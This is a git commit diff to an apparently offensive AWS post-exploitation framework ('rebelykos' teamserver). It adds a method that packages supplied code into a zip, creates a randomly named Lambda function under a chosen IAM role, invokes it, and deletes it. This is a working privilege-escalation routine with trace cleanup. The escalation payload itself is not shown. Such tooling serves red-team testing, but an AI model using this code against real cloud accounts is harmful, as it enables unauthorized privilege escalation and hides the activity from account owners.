cb68bfbdca341b588757a6637591b7404e98bdcf
Takah1ro <tkhr.y0k0yama@gmail.com>
2021-10-13 19:46:45 +0900

    Add lambda function to module.py

--- rebelykos/core/teamserver/module.py
+++ rebelykos/core/teamserver/module.py
@@ -1,6 +1,12 @@
+import os
+import tempfile
+import zipfile
+
 import botocore
 
 from rebelykos.core.response import Response as res
+from rebelykos.core.utils import gen_random_string
+
 
 class Module:
     def __init__(self):
@@ -80,6 +86,55 @@ class Module:
             yield (res.RESULT,
                    {"PolicyName": policy.policy_name,
                     "Statement": policy.policy_document["Statement"]})
+
+    def _lambda_privesc(self, lambda_privesc, role, client):
+        func_name = gen_random_string()
+        with tempfile.TemporaryDirectory() as tmpdirname:
+            zfile = os.path.join(tmpdirname, "lambda_privesc.py.zip")
+            with zipfile.ZipFile(zfile, "w", zipfile.ZIP_DEFLATED) as fp:
+                info = zipfile.ZipInfo("lambda_privesc.py")
+                info.external_attr = 0o644 << 16
+                fp.writestr(info, lambda_privesc)
+            os.chmod(zfile, int("755", 8))
+            with open(zfile, "rb") as fp:
+                zfile_bytes = fp.read()
+                func_info, result = self._handle_err(
+                    client.create_function,
+                    FunctionName=func_name,
+                    Role=role,
+                    Handler="lambda_privesc.lambda_handler",
+                    Code={"ZipFile": zfile_bytes},
+                    Runtime="python3.9"
+                )
+                yield func_info
+                if result[0] == res.RESULT:
+                    status = result[1]["ResponseMetadata"]["HTTPStatusCode"]
+                    yield res.INFO, {"HTTPStatusCode": status}
+                    func_info, result = self._handle_err(
+                        client.invoke,
+                        InvocationType="RequestResponse",
+                        # LogType="Tail",
+                        FunctionName=func_name
+                    )
+                    yield func_info
+                    if result[0] == res.RESULT:
+                        stat = result[1]["ResponseMetadata"]["HTTPStatusCode"]
+                        yield res.INFO, {"HTTPStatusCode": stat}
+                        func_info, result = self._handle_err(
+                            client.delete_function,
+                            FunctionName=func_name
+                        )
+                        yield func_info
+                        if result[0] == res.RESULT:
+                            res_meta = result[1]["ResponseMetadata"]
+                            status = res_meta["HTTPStatusCode"]
+                            yield res.INFO, {"HTTPStatusCode": status}
+                        else:
+                            yield result
+                    else:
+                        yield result
+                else:
+                    yield result
 
     def __getitem__(self, key):
         for k, v in self.options.items():
